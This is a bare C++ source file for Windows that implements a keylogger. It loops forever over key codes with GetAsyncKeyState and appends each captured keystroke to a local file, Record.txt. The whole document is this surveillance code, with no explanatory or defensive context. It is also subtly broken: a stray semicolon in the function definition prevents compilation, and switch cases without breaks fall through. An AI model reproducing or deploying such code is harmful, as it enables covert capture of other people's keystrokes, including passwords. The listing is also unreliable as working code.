#include <iostream>
#include <windows.h>
#include <Winuser.h>
#include <fstream>

using namespace std;

void log();

int main()
{
    log();
    return 0;
}


void log();
{
    char c;

    for(;;)
    {
       for(c = 8; c <= 222; c++)
       {
            if(GetAsyncKeyState(c) == -32767)
            {
                ofstream write ("Record.txt", ios::app);
            
                switch(c)
                {
                    case 8: write << "<BackSpace>";
                    case 27: write << "<Esc>";
                    case 127: write << "<DEL>";
                    case 32: write << " "; 
                    case 13: write << "<Enter>\n";
                    default: write << c;
                }
            }
       }
    }
}